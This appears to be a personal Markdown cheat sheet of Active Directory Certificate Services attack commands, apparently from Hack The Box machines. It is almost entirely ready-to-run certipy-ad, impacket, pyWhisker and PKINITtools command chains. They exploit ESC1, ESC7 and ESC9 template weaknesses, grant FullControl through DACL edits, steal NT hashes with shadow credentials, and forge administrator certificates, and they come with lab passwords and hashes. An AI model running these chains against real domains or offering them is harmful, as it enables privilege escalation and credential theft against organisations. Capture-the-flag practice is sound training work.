# Certipy-ad from Linux

## To Find Vulnerable Certificates (Do this for all users)
```
certipy-ad find -u ryan.cooper -p NuclearMosquito3 -stdout -vulnerable -dc-ip 10.10.11.202
```

## ESC9 Certificate
- Certified HTB Box
- https://medium.com/r3d-buck3t/adcs-attack-series-abusing-esc9-for-privilege-escalation-via-weak-certificate-mapping-d625aceb5942
```
certipy-ad find -target-ip 10.10.11.41 -u ca_operator -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout      # To find the vuln CA
```
- We will need a user on which we have write permissions like genericwrite, daclwrite or genericall (skip next 2 steps if hash is already known of user we have control over)
```
impacket-dacledit -action write -rights 'FullControl' -principal blwasp -target james -dc-ip 10.129.228.236 lab.local/blwasp:'Password123!'       # Modify the user to have full control over it

certipy-ad shadow auto -u 'blwasp@lab.local' -p 'Password123!' -account james -dc-ip 10.129.228.236    # Retrieve NT hash of that user

certipy-ad account update -u 'blwasp@lab.local' -p 'Password123!' -user james -upn administrator@lab.local -dc-ip 10.129.228.236        # update upn of account we have control over

certipy-ad req -u 'james@lab.local' -hashes 7facdc498ed1680c4fd1448319a8c04f -ca <Certificate authtority name> -template <vulnerable template name> -dc-ip 10.129.228.236     # Request the certificate

certipy-ad account update -u 'blwasp@lab.local' -p 'Password123!' -user james -upn james@lab.local -dc-ip 10.129.228.236        # Revert the changes to avoid broken auth

certipy-ad auth -pfx administrator.pfx -domain lab.local -dc-ip 10.129.228.236      # Get NT hash of administrator
```

## pyWhisker - ESC9 Certificate
- Certified HTB Box
```
python /opt/pywhisker/pywhisker/pywhisker.py -d certified.htb -u judith.mader -p judith09 --target "management_svc" --action "add"      # To get the PFX/PEM files

python /opt/PKINITtools/gettgtpkinit.py -cert-pem oQRzA7zC_cert.pem -key-pem oQRzA7zC_priv.pem certified.htb/management_svc management_svc.ccache       # get key and ccache from cert

export KRB5CCNAME=/home/kali/cysec/practice/HTB/Windows/Certified/management_svc.ccache     # export ccache to be used by kerberos

python /opt/PKINITtools/getnthash.py -key 3888c3ef073a3cc612d461b24b3826f9505106e4b26a3d50ef5a3677b6c87bf1 certified.htb/management_svc     # get NT hash from TGT / ccache
```

## ESC7 Certificate
```
certipy-ad find -target-ip 10.10.11.236 -u raven -p "R4v3nBe5tD3veloP3r\!123" -vulnerable -stdout           # To Find Vuln Templates

certipy-ad ca -ca manager-DC01-CA -dc-ip 10.10.11.236 -u raven -p "R4v3nBe5tD3veloP3r\!123" -add-officer raven      # Add your user as officer if not already

certipy-ad ca -ca manager-DC01-CA -dc-ip 10.10.11.236 -u raven -p "R4v3nBe5tD3veloP3r\!123" -add-manager raven      # Add your user as manager if not already

certipy-ad ca -ca manager-DC01-CA -dc-ip 10.10.11.236 -u raven -p "R4v3nBe5tD3veloP3r\!123" -enable-template "SubCA"        # Enable SubCA template to abuse if not already enabled

certipy-ad req -ca manager-DC01-CA -dc-ip 10.10.11.236 -u raven -p "R4v3nBe5tD3veloP3r\!123" -template SubCA -target dc01.manager.htb -upn administrator@manager.htb        # It will get denied - Note the request ID

certipy-ad ca -ca manager-DC01-CA -dc-ip 10.10.11.236 -u raven -p "R4v3nBe5tD3veloP3r\!123" -target dc01.manager.htb -issue-request 23      # Should go thorugh - if problems, add as officer again

certipy-ad req -ca manager-DC01-CA -dc-ip 10.10.11.236 -u raven -p "R4v3nBe5tD3veloP3r\!123" -template SubCA -target dc01.manager.htb -retrieve 23      # Will save administrator.pfx file

certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236          # To get TGT and Hash of admin account - run "rdate -n <dc ip>" if clock error
```

## ESC1 Certificate
```
certipy-ad req -u ryan.cooper -p NuclearMosquito3 -template UserAuthentication -ca sequel-DC-CA -dc-ip 10.10.11.202 -target 10.10.11.202 -upn 'administrator@sequel.htb' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'       # To request pfx as administrator user

certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.202'          # Use pfx file to auth as admin and get NTLM hash
```

# GenericWrite, GenericAll, WriteOwner AD Misconfigs
- Certified HTB Box
- Administrator HTB Box